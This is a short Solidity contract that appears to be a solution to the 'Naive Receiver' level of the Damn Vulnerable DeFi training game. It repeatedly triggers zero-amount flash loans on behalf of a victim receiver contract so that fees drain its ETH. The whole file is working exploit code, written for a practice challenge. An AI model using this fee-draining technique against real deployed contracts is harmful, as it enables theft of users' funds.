// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

/**
 * @title HackNaiveReciever
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract HackNaiveReciever {
    using Address for address;

    function performHack(address flashloanReciever, address flashloanProvider)
        external
    {
        // Transfer ETH and handle control to receiver
        uint8 _length = 10;
        for (uint8 i; i < 10; i++) {
            flashloanProvider.functionCallWithValue(
                abi.encodeWithSignature(
                    "flashLoan(address,uint256)",
                    flashloanReciever,
                    0 ether
                ),
                0 ether
            );
        }
    }
}
